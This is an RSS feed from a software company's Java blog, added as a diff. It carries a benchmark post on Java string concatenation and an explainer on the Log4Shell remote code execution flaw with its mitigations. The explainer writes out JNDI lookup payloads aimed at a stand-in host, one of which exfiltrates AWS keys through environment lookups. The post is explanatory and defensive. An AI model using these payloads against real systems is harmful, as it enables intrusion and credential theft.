@@ -1,0 +1,423 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Java &#8211; Vivasoft</title>
+	<atom:link href="/blog/tag/java/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Top Software Company with Talented Geeks</description>
+	<lastBuildDate>Wed, 10 Aug 2022 08:26:19 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1</generator>
+
+<image>
+	<url>/wp-content/uploads/2021/08/cropped-feb-icon-32x32.png</url>
+	<title>Java &#8211; Vivasoft</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>How string concatenation with plus operator reduce your application’s performance</title>
+		<link>/blog/how-string-concatenation-with-plus-operator-reduce-your-applications-performance/</link>
+					<comments>/blog/how-string-concatenation-with-plus-operator-reduce-your-applications-performance/#respond</comments>
+		
+		<dc:creator><![CDATA[Mukit Chowdhury]]></dc:creator>
+		<pubDate>Wed, 03 Aug 2022 09:10:58 +0000</pubDate>
+				<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Java]]></category>
+		<guid isPermaLink="false">/?p=9875</guid>
+
+					<description><![CDATA[As programmers, we often have to add or concatenate different strings. This string concatenation is an essential topic in Java. This is because if the string concatenation is not done efficiently, it will affect the program’s performance. To understand the effect of this performance, let’s discuss a problem with LeetCode. The problem is Step By Step [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p>As programmers, we often have to add or concatenate different strings. This string concatenation is an essential topic in Java. This is because if the string concatenation is not done efficiently, it will affect the program’s performance.</p>
+<p>To understand the effect of this performance, let’s discuss a problem with LeetCode. The problem is <a href="https://leetcode.com/problems/step-by-step-directions-from-a-binary-tree-node-to-another/" rel="nofollow noopener" target="_blank">Step By Step Directions From A Binary Tree Node to Another</a>.</p>
+<p>In this problem, a binary tree is given. After giving the source and destination, we are asked to return the shortest path from the source to the destination.</p>
+<p>Since only the root of the tree was given, my approach was first to take the edge out of the tree and bring the info of the traditional graph. Then keep track of the path while figuring out the shortest path by implementing <a href="https://en.wikipedia.org/wiki/Breadth-first_search" rel="nofollow noopener" target="_blank">BFS</a>. At the end of all, find the path and return it. Simple, but I got Time Limit Exceeded (or TLE. This verdict is given when someone got failed to pass the constrained runtime of the problem) after submitting! Why! Missed something in Constraint? No, not at all. The algorithm is straightforward BFS, so the complexity is also OK. So, maybe, there is a problem with the code, and I started looking at the code again, and then the problem came out.</p>
+<p>While concatenating the path, I was concatenating regular strings with the <strong>+ </strong>operator. What’s wrong with the <strong>+</strong> operator? That is what I will try to write now.</p>
+<p>In Java, strings are immutable. This means that a string object cannot be changed. A new string object will be created, whatever change we do to that string.</p>
+<p>In the above problem, since I was concatenating the directions of edges with the <strong>+</strong> operator, a new string object was created for each concatenation. During object creation through string concatenation, new memories (string objects and byte arrays) are taken from the heap, the characters of the previous string are copied, and characters of the new string are added. When you have to concat many strings through a loop, using <strong>+</strong> operator is not a good approach at all, because every concatenation has these tasks. As a result, my solution got TLE.</p>
+<p>In the case of <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/StringBuilder.html" rel="nofollow noopener" target="_blank">StringBuilder</a>, new objects are not created during each concatenation. StringBuilder first takes a memory of a certain capacity. If you need to append a new string, it dynamically creates a new byte array with the required memory, copies the contents of the StringBuilder there, then copies the contents of the new string. The process is such that these tasks aren’t done too many times. For example, if the initial capacity is 16, then to become a StringBuilder’s size 10^6, a new byte array creation and copying there can be happened at most 16 times (according to Oracle Java-11).</p>
+<p>So it turns out that, with the <strong>+</strong> operator, for each concatenation, a byte array is created with a new size, contents are copied, and a new string object is created. But in the case of StringBuilder, these tasks are only on demand. So when many strings are needed together, StringBuilder is a better option. For this reason, my solution got accepted after using StringBuilder.</p>
+<p>Showing some numbers to understand how much performance has been achieved using StringBuilder instead of the <strong>+</strong> operator. I have seen the accepted solution of 1.431 seconds to this problem. So I am assuming that this problem’s time limit is at least 1.5 seconds. This means that the solution of the string concatenation with the <strong>+</strong> operator could not finish the execution in 1.5 seconds. Since actual data is unavailable from Leetcode, I am assuming it finished in 1.5 seconds (reduced, it should take more). StringBuilder’s solution took 0.461 seconds. That means, a <strong>67.93%</strong> performance gain! Actually, the performance gain is much better than this. As Leetcode doesn’t give us info about the actual time taken by a TLE solution, we assumed a time that is much fewer than the actual.</p>
+<p>Now let’s get some actual values. Let’s concat some random strings with the <strong>+</strong> operator, then concat those same strings with other ways and compare them using <em class="kz"><a href="https://github.com/openjdk/jmh#readme" rel="nofollow noopener" target="_blank">Java Microbenchmark Harness</a> or JMH</em>. I will compare by concatenating 100 thousand strings of 10 lengths. Let me first declare two variables:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private static final int TOTAL_STRING = 100_000;
+private static List&lt;String&gt; randomStringList = new ArrayList&lt;&gt;();</pre>
+<p>Then writing a method for random string generation:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private String getRandomString(Random random) {
+    var leftLimit = 48; // numeral '0'
+    var rightLimit = 122; // letter 'z'
+    var targetStringLength = 10;
+    return random.ints(leftLimit, rightLimit + 1)
+        .filter(i -&gt; (i &lt;= 57 || i &gt;= 65) &amp;&amp; (i &lt;= 90 || i &gt;= 97))
+        .limit(targetStringLength)
+        .collect(StringBuilder::new, StringBuilder::appendCodePoint, 
+            StringBuilder::append)
+        .toString();
+}</pre>
+<p>Now writing a method to concat the string with the <strong>+</strong> operator</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private int concatWithPlusOperator(List&lt;String&gt; list) {
+    var string = "";
+    for (var i = 0;i&lt;list.size(); i++)
+        string += list.get(i);
+    return string.length();
+}</pre>
+<p>Let’s write the method of concat strings with StringBuilder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private int concatWithStringBuilder(List&lt;String&gt; list) {
+    var stringBuilder = new StringBuilder();
+    for (var i = 0;i&lt;list.size(); i++)
+        stringBuilder.append(list.get(i));
+    return stringBuilder.length();
+}</pre>
+<p>Comparing two more ways to concat String. Here the first one is <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/StringJoiner.html" rel="nofollow noopener" target="_blank">StringJoiner</a> (introduced in Java 8):</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private int concatWithStringJoiner() {
+    var stringJoiner = new StringJoiner(",");
+    for (var string : randomStringList)
+        stringJoiner.add(string);
+    return stringJoiner.toString().length();
+}</pre>
+<p>And the second one is <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/String.html#join(java.lang.CharSequence,java.lang.CharSequence...)" rel="nofollow noopener" target="_blank">String.join()</a> (also introduced in Java 8):</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">private int concatWithStringJoin() {
+    var string = String.join(",", randomStringList);
+    return string.length();
+}</pre>
+<p>Now here is a static block to store the generated random strings in the list:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">static {
+    var random = new Random();
+    for (var i = 0; i &lt; TOTAL_STRING; i++) {
+        randomStringList.add(getRandomString(random));
+    }
+}</pre>
+<p>Finally, writing the benchmark method for concatenation with the <strong>+</strong> operator:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">@Fork(value = 10, warmups = 5)
+@Benchmark
+@OutputTimeUnit(TimeUnit.MILLISECONDS)
+@BenchmarkMode(Mode.AverageTime)
+public void doBenchMarkOfPlusOperator() {
+    int len = concatWithPlusOperator(randomStringList);
+}</pre>
+<p>and the benchmark method for concatenation with StringBuilder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">@Fork(value = 10, warmups = 5)
+@Benchmark
+@OutputTimeUnit(TimeUnit.MILLISECONDS)
+@BenchmarkMode(Mode.AverageTime)
+public void doBenchMarkOfStringBuilder() {
+    int len = concatWithStringBuilder(randomStringList);
+}</pre>
+<p>Benchmark method for StringJoiner:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">@Fork(value = 10, warmups = 5)
+@Benchmark
+@OutputTimeUnit(TimeUnit.MILLISECONDS)
+@BenchmarkMode(Mode.AverageTime)
+public void doBenchMarkOfStringJoiner() {
+    int len = concatWithStringJoiner();
+}</pre>
+<p>And the last one is the benchmark method for String.join():</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">@Fork(value = 10, warmups = 5)
+@Benchmark
+@OutputTimeUnit(TimeUnit.MILLISECONDS)
+@BenchmarkMode(Mode.AverageTime)
+public void doBenchMarkOfStringJoin() {
+    int len = concatWithStringJoin();
+}</pre>
+<p>Let’s see the Benchmark results:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">Benchmark                                   Mode  Cnt     Score    Error  Units         
+BenchmarkRunner.doBenchMarkOfPlusOperator   avgt   50  4970.270 ± 68.968  ms/op           
+BenchmarkRunner.doBenchMarkOfStringBuilder  avgt   50     1.454 ±  0.023  ms/op                
+BenchmarkRunner.doBenchMarkOfStringJoin     avgt   50     1.987 ±  0.017  ms/op               
+BenchmarkRunner.doBenchMarkOfStringJoiner   avgt   50     1.961 ±  0.039  ms/op</pre>
+<p>See, it takes 1.454, 1.987 and 1.961 <strong>milliseconds</strong> on average with StringBuilder, String.join() and StringJoiner respectively, whereas to do the same concatenation of 100 thousand strings of 10 lengths, the <strong>+</strong> operator is taking 4970.270 <strong>milliseconds</strong> on average! How inefficient the plus operator way is to contact String objects!</p>
+<p>You will get the full code here: <a href="https://github.com/Mukit09/jmh/tree/main/string-concatenation" rel="nofollow noopener" target="_blank">github-repo</a></p>
+<p>By the way, none of the StringBuilder, StringJoiner, and String.join() is thread-safe. If thread safety is concerned, StringBuffer should be used. Since it is thread-safe, StringBuffer is slower than StringBuilder.</p>
+<p>StringJoiner and String.join() are useful to have a concise code when we need to make a string separated by a specific delimiter, from a string collection.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/how-string-concatenation-with-plus-operator-reduce-your-applications-performance/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Apache Log4j aka Log4Shell Vulnerability &#8211; Remote Code Execution</title>
+		<link>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/</link>
+					<comments>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/#comments</comments>
+		
+		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
+		<pubDate>Thu, 30 Dec 2021 18:35:45 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Personal]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Technology]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[logging]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<guid isPermaLink="false">/?p=5037</guid>
+
+					<description><![CDATA[Critical Severity Web Vulnerability When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability [&#8230;]]]></description>
+										<content:encoded><![CDATA[<h3 id="critical-severity-web-vulnerability">Critical Severity Web Vulnerability</h3>
+<p>When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability in a very widely used library in Java, this is used for logging named <strong>Apache Log4j</strong> also known as <strong>Log4j</strong>.</p>
+<blockquote><p>Vulnerabilities are discovered all the time. Whenever a vulnerability is found, it gets patched by the community members as soon as possible.</p></blockquote>
+<p>I learned a lot from <a title="https://www.youtube.com/watch?v=uyq8yxWO1ls" href="https://www.youtube.com/watch?v=uyq8yxWO1ls" data-from-md="" rel="nofollow noopener" target="_blank">this video</a>. Anyone reading this article may refer to his videos for in-depth learning. Also, I&#8217;m using his used examples here too.</p>
+<p>Thanks, <a href="https://www.linkedin.com/in/rafat-ibn-rashid/" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p>
+<h2 id="what-is-log4j">What is Log4j?</h2>
+<p>Log4j is a very popular java logging library that is used for logging data from out program into files or console shells when something goes wrong, during debugging, errors are raised, API request body(payload), etc to lookup these logged data to troubleshoot or get better insights. This is usually what typical logging libraries are used for. This <code class="inline-code">Log4j</code> library was so popular that even if a java based codebase doesn&#8217;t use it directly, there is a very high possibility that some direct or indirect dependencies are using it. Now, because of the high usage of <code class="inline-code">Log4j</code>, the recently found vulnerability raises some serious concern for the java based applications.</p>
+<blockquote>
+<h4 id="any-java-codebase-that-uses-log4j-can-be-hacked-unless-you-are-using-their-latest-patch-version2171-after-this-vulnerability-was-found">Any <code class="inline-code">java</code> codebase that uses <code class="inline-code">Log4j</code> can be hacked unless you are using their latest patch version(&gt;=2.17.1) after this vulnerability was found.</h4>
+</blockquote>
+<p>All enterprise and other application developers are now racing to put this patch, updating their <code class="inline-code">Log4j</code> version to the recently patched version which is 2.17.1 or higher(in the future) to avoid this vulnerability in their programs. Upgrading the <code class="inline-code">Log4j</code> or any other package may lead to more bugs if you don&#8217;t know what you&#8217;re doing. As we speak many packages apply these patches to the code where they use <code class="inline-code">Log4j</code>. But there&#8217;s a possibility that some may not apply this patch which makes us vulnerable if we use that third-party library package in our codebase.</p>
+<blockquote><p>Note: Hackers are also racing to exploit their targets before applications apply this patch to their codebase and deploy it into production.</p></blockquote>
+<p>Those of us who are thinking, well, we don&#8217;t use <code class="inline-code">Log4j</code> in our codebase so this vulnerability isn&#8217;t going to affect us. Well, this is where the fun begins. Because of the popularity of <code class="inline-code">Log4j</code>, the third-party libraries and their direct/indirect dependent libraries may use log4j to log their stuff.</p>
+<blockquote><p>snyk &#8211; A developer security company &#8211; found out that almost 60% plus java applications out there use <code class="inline-code">Log4j</code> indirectly.</p></blockquote>
+<p>Using those usages of log4j in the dependencies of your application, your application falls under the threat of this vulnerability as well. So everyone needs to apply this patch to their codebase and redeploy their application into production.</p>
+<p>Those of us who are still thinking, we don&#8217;t have to put this patch or this vulnerability has nothing to do with us. There&#8217;s a scoring system called <code class="inline-code">CVSS</code> which stands for <strong>Common Vulnerability Scoring System</strong>. It provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity. This <code class="inline-code">CVSS</code> system rated this vulnerability 10 out of 10 which is pretty scary for java developers. This vulnerability has the highest score possible. And why is that? The reason for this is, this vulnerability enables what is known as <strong>RCE</strong>.</p>
+<h2 id="what-is-rce">What is RCE?</h2>
+<p><code class="inline-code">RCE</code> stands for <strong>Remote Code Execution</strong>. What this means is, hackers are allowed to execute any code on your machine by hacking into your application which uses <code class="inline-code">log4j</code> directly or indirectly. This vulnerability was nick-named as <code class="inline-code">Log4Shell</code> and the reason is, anyone can open a shell on your server and issue commands. Scary right?</p>
+<p>Let&#8217;s explain how we arrive at this scary problem. There are a few things that lead to this vulnerability altogether. Let&#8217;s go one by one.</p>
+<h4 id="1-log4j-allow-us-to-log-expressions">1. Log4j allow us to log expressions</h4>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
+</div>
+<p>In the first line, we get the logger client and then we log the error messages. So we are plugging the error object into the string. Java will run this <code class="inline-code">error.getMessages()</code> code and send this value which will be used by <code class="inline-code">log4j</code> to plug that error value into the string. We&#8217;ll see an output that will contain the error string and whatever the <code class="inline-code">error.getMessages</code> returns into that <code class="inline-code">{}</code> curly braces which are called <strong>string interpolation</strong> and going to print it.</p>
+<p>Another example,</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Info(&quot;user {} has logged in using id {}&quot;, map.get(&quot;Name&quot;), user.getId());</code></pre>
+</div>
+<p>As long as the value passed here log4j will print it and it&#8217;s the standard logging mechanism by most of the logging library, there&#8217;s nothing special, right? This mechanism is not the problem here.</p>
+<h4 id="2-jndi">2. JNDI</h4>
+<p><code class="inline-code">JNDI</code> stands for <strong>Java Naming and Directory Interface</strong>. This allows us to store java objects to a remote location and then serialize them to your <code class="inline-code">JVM</code> which is kind of streaming to <code class="inline-code">JVM</code>. As scary as it seems, this technology has been in existence from the era before rest API and it was quite popular at that time. This was a redistributed java system that would work with each other to communicate. This has lost its popularity now but it still exists in java for backward compatibility reasons.<br />
+Let&#8217;s have an example,</p>
+<div class="joplin-editable">
+<pre><code class="language-">ldap://192.168.1.22:8080/O=Rezwanul,C=BD</code></pre>
+</div>
+<p>This is an active directory link that uses <code class="inline-code">LDAP</code> protocol and we can invoke the URL and get a serialized java object in return from somewhere from a remote server. In our example, it is most probably the profile object we get from the active directory. This has nothing to do with <code class="inline-code">log4j</code>, It&#8217;s a Java feature that has been in java for years. We can enable/disable it, it&#8217;s encouraged to disable it. It hasn&#8217;t been removed from java because java never deprecates anything for backward compatibility reasons, for example, even codes from 1995(java first released year) code can be run on the latest JVM and latest Java compiler.</p>
+<blockquote>
+<h4 id="this-feature-is-harmless-in-and-as-of-itself">This feature is harmless in and as of itself</h4>
+</blockquote>
+<h4 id="3-jndi-lookup-in-log-messages">3. JNDI lookup in log messages</h4>
+<p>In 2013, A feature was introduced in Log4j by a contributor, which uses the <code class="inline-code">JNDI</code> lookups from the logging messages. A good use case for this feature would be a centralized logging configuration from a config server and we want to serialize that configuration using <code class="inline-code">JNDI</code> lookups.<br />
+Let&#8217;s go back to our first log message example again&#8230;</p>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
+</div>
+<p>We&#8217;re going to use log message for <code class="inline-code">JNDI</code> lookups</p>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;{}: error: {}&quot;, &quot;${jndi:ldap://logconfig/prefix}&quot;, error.getMessages());</code></pre>
+</div>
+<p>So what we&#8217;re doing here is, we&#8217;re getting a prefix for the logging message from the configuration server and passing the <code class="inline-code">JNDI</code> URL as an argument. We&#8217;re not passing a value that auto resolves but we&#8217;re passing a URL as a string value but this is not something that JAVA resolves, this is something that we&#8217;re passing to log4j. The difference is <code class="inline-code">log4j</code> does lookups for certain types of strings.<br />
+For example,</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;insert string here: {}&quot;, &quot;hello world&quot;);</code></pre>
+</div>
+<p>The above code will insert the <code class="inline-code">hello world</code> string in the curly braces. But the string we&#8217;re passing as an argument has a special syntax like below <code class="inline-code">${jndi:ldap://...}</code></p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${jndi:ldap://...}&quot;);</code></pre>
+</div>
+<p>This type of value says log4j to look up and resolve for a serialized value and insert it into the curly braces. As the argument says <code class="inline-code">JNDI</code> log4j uses a <code class="inline-code">JNDI</code> lookup and it&#8217;s going to look up the value and insert it into the braces. Another example</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${env:ENV_VALUE}&quot;);</code></pre>
+</div>
+<p>As the argument says <code class="inline-code">env</code> log4j uses the environment variable lookups and inserts it into the curly braces.</p>
+<blockquote>
+<h3 id="this-is-the-vulnerability-were-talking-about-remote-code-executionrce">This is the vulnerability we&#8217;re talking about, <strong>Remote Code Execution(RCE)</strong></h3>
+</blockquote>
+<p>This feature aka serious bug requested in 2013. To check that <a title="https://issues.apache.org/jira/browse/LOG4J2-313" href="https://issues.apache.org/jira/browse/LOG4J2-313" data-from-md="" rel="nofollow noopener" target="_blank">click here</a>.</p>
+<p>Are you wondering how this is a vulnerability? Let&#8217;s give an example<br />
+Let&#8217;s say you&#8217;ve got a search page and an end-user can put some search criteria on an input box and submit it and on the server, you&#8217;re logging it, the search term.</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Info(&quot;search page: searched issued for {}&quot;, searchTerm);</code></pre>
+</div>
+<p>With this simple Info log message, we can think about what can go wrong. Nothing right? Let&#8217;s imagine if the search term looks like below <code class="inline-code">${jndi:ldap://want.to.heck/maliciousobject}</code>, What will happen now, what will the simple Info log message do&#8230;</p>
+<p><code class="inline-code">log4j</code> will do a <code class="inline-code">JNDI</code> request to whatever domain passed in the search term.<br />
+Let&#8217;s use a simple diagram to show what&#8217;s happening</p>
+<p><img decoding="async" class="alignnone size-full wp-image-5039" src="/wp-content/uploads/2021/12/RCE.drawio.png" alt="RCE.drawio Apache Log4j aka Log4Shell Vulnerability - Remote Code Execution" width="578" height="413" srcset="/wp-content/uploads/2021/12/RCE.drawio.png 578w, /wp-content/uploads/2021/12/RCE.drawio-480x343.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 578px, 100vw"></p>
+<p>What&#8217;s happening here is, someone puts a <code class="inline-code">JNDI</code> URL as the search term and submits the request. The app server which contains that vulnerable log4j version logs the search term. The server now does a <code class="inline-code">JNDI</code> request to that malicious server and gets a serialized malicious object. What this malicious object contains who knows, log4j will take that object, and now your app <code class="inline-code">JVM</code> has a java object which the application didn&#8217;t put in there. That malicious server (well, the malicious people behind that server) now can put a java object in somebody else&#8217;s <code class="inline-code">JVM</code>.</p>
+<blockquote>
+<h3 id="this-sounds-like-crazy-but-this-is-what-this-vulnerability-is-to-be-exact">This sounds like crazy but This is what this vulnerability is to be exact.</h3>
+</blockquote>
+<p>So the malicious person, in his malicious java object, can put a static block that contains whatever code he wants and this is going to run it.</p>
+<p>Imagine you can insert the java object of your code in the JVM of a popular e-commerce website or JVM of a popular social media website and then you may control everything on that site. Sounds scary&#8230; Adding salt to this to make it more interesting is you can initiate this as many times as you want to execute whatever code you want to run this type of attack. This is also known as <strong>Remote code execution aka RCE</strong></p>
+<p>Isn&#8217;t this pattern almost looking like <strong>SQL Injection</strong>? SQL Injection is also a similar vulnerability. In this type of attack, a Malicious user put malicious SQL code which executes itself on your app code. You&#8217;re passing this malicious code as a query param from your app frontend. That&#8217;s why we don&#8217;t string append or didn&#8217;t do resolves on user inputs. We can call this <strong>Log Injection</strong> aka <strong>Log Forgery</strong>. Log injection attack has been happening for quite some time now.</p>
+<blockquote>
+<h4 id="log-injection-or-log-forgery-is-a-vulnerability-that-arises-when-un-trusted-and-un-validated-input-is-allowed-to-be-printed-in-system-log-files">Log Injection (or Log Forgery) is a vulnerability that arises when un-trusted and un-validated input is allowed to be printed in system log files.</h4>
+</blockquote>
+<p>Let&#8217;s look at the below search term.</p>
+<div class="joplin-editable">
+<pre><code class="language-">\nINFO: Looks like a problem with our calculation./nError: rollback transaction for Rezwanul</code></pre>
+</div>
+<p>This tells us we make a mistake in the calculation and we&#8217;re rollbacking the transaction. In contrast to this, we may decide to refund the user. but this isn&#8217;t the case really, right?<br />
+Log injections are easy to figure out and less harmful. We can&#8217;t do considerable damage with it. Compared to this <strong>RCE</strong> will result in a completely different story and cause serious problems.</p>
+<h2 id="solving-the-issue">Solving the Issue</h2>
+<h3 id="using-jvm-flags">Using JVM flags</h3>
+<p>This is the easiest one. Set these <code class="inline-code">JVM</code> flags to <code class="inline-code">false</code></p>
+<div class="joplin-editable">
+<pre><code class="language-java">com.sun.jndi.ldap.object.trustURLCodebase
+com.sun.jndi.rmi.object.trustURLCodebase</code></pre>
+</div>
+<p>Which is telling java that, do you want to trust code that is coming from a URL that handles JNDI or RMI URL resolves kind of stuff? Set these flags to <code class="inline-code">false</code> and you&#8217;re good to go. After that Java won&#8217;t run any code which is coming from a URL. Java will stop it and Log4j will be stopped from logging it.<br />
+Lots of people turn this off as this is scary stuff and yet lots of people out there don&#8217;t even know this exists and they have servers running with this thing turned on and if they have that version of log4j which is vulnerable, may cause serious problems.</p>
+<p>Even if these flags are turned off there is still vulnerability. Remember our environment variable resolving example in the above. Most application has some environment variable set up on the server.</p>
+<div class="joplin-editable">
+<pre><code class="language-java">${jndi:ldap://want.to.heck/${env:AWS_ACCESS_KEY}/${env:AWS_ACCESS_KEY_SECRET}}</code></pre>
+</div>
+<p>A call with the above example goes out like that, then JVM will resolve those environment variables and then initiate the JNDI request which leads to a security breach on AWS as the AWS keys are exposed. This may lead to a situation where clients experience unwanted bills on AWS. Scary right? We don&#8217;t want anything to happen to our clients, do we?</p>
+<p>So here is our next solution:</p>
+<h3 id="update-log4j">Update log4j</h3>
+<p>We need to update log4j to the latest version(like 2.17.1) which doesn&#8217;t have this vulnerability. This sounds simple but it can be problematic if you have dependencies that depend on something else which don&#8217;t support the latest log4j version you are trying to update. In that case we have to wait for that dependent library to patch log4j, well while we&#8217;re waiting scary things may happen if you want to take that risk.</p>
+<h3 id="patch-the-class-directly">Patch the class directly</h3>
+<p>So in this approach, we patch the java class directly into our version of log4j or the third-party library which uses log4j and patch it on the server so that we don&#8217;t face the above issue.</p>
+<p>If you like, you can read the same article on my<a href="https://rezwanul-haque.hashnode.dev/apache-log4j-aka-log4shell-vulnerability-remote-code-execution" rel="nofollow noopener" target="_blank"> [Personal blog]</a></p>
+<p>&gt; #### You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></p>
+<h3 id="use-dependency-constraints-using-gradle">Use Dependency Constraints using Gradle</h3>
+<p>This will allow you to forcefully use a version of dependency you define in Gradle. No matter what the version that the dependent library use, you force them to use the version you choose.</p>
+<p>In Conclusion, Open Source projects are secure most of the time no doubt about it. But just because it&#8217;s open-source, doesn&#8217;t mean it hasn&#8217;t been exposed to vulnerability. Many people will review contributors code for bugs and vulnerability but We need to ask the question,</p>
+<blockquote>
+<h3 id="is-the-person-reviewing-a-piece-of-code-is-the-right-person-to-do-that-review-or-not">Is the person reviewing a piece of code is the right person to do that review or not?</h3>
+</blockquote>
+<p>This log4j vulnerability is out there for almost <strong>9</strong> years, who knows what type of problem it caused in all these years. From a developer&#8217;s perspective, our implemented code may not be buggy at first glance as we don&#8217;t think how a security expert will think on that same implementation.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/feed/</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>স্প্রিং সিকিউরিটিঃ আপনার অ্যাপ্লিকেশনের সুরক্ষায়</title>
+		<link>/blog/%e0%a6%b8%e0%a7%8d%e0%a6%aa%e0%a7%8d%e0%a6%b0%e0%a6%bf%e0%a6%82-%e0%a6%b8%e0%a6%bf%e0%a6%95%e0%a6%bf%e0%a6%89%e0%a6%b0%e0%a6%bf%e0%a6%9f%e0%a6%bf%e0%a6%83-%e0%a6%86%e0%a6%aa%e0%a6%a8%e0%a6%be%e0%a6%b0/</link>
+					<comments>/blog/%e0%a6%b8%e0%a7%8d%e0%a6%aa%e0%a7%8d%e0%a6%b0%e0%a6%bf%e0%a6%82-%e0%a6%b8%e0%a6%bf%e0%a6%95%e0%a6%bf%e0%a6%89%e0%a6%b0%e0%a6%bf%e0%a6%9f%e0%a6%bf%e0%a6%83-%e0%a6%86%e0%a6%aa%e0%a6%a8%e0%a6%be%e0%a6%b0/#respond</comments>
+		
+		<dc:creator><![CDATA[Ashiqul]]></dc:creator>
+		<pubDate>Tue, 08 May 2018 09:11:43 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[Spring]]></category>
+		<category><![CDATA[Spring Boot]]></category>
+		<category><![CDATA[Spring Security]]></category>
+		<category><![CDATA[Web App]]></category>
+		<guid isPermaLink="false">http://www.vivacomsolutions.com/?p=1622</guid>
+
+					<description><![CDATA[স্প্রিং সিকিউরিটিঃ আপনার অ্যাপ্লিকেশনের সুরক্ষায় যেকোন ওয়েব অ্যাপ্লিকেশন এর ক্ষেত্রে সিকিউরিটি একটি অত্যন্ত গুরুত্বপুর্ণ ব্যাপার। আমরা জানি ইন্টারনেট প্রচুর দুষ্ট লোকজন দিয়ে ভর্তি  । অনেক অনেক বিনিদ্র রজনী পার করে লাইনের পর লাইন কোড লিখে যখন অবশেষে আমরা আমাদের অ্যাপটিকে নিজস্ব লোকাল সার্ভার থেকে ইন্তারনেট নামক সেই ভয়াল জঙ্গলে আপ্লোড করি, আমরা চাই আমাদের অতি আদরের [&#8230;]]]></description>
+										<content:encoded><![CDATA[<h1 class="the-title entry-title"><strong>স্প্রিং সিকিউরিটিঃ আপনার অ্যাপ্লিকেশনের সুরক্ষায়</strong></h1>
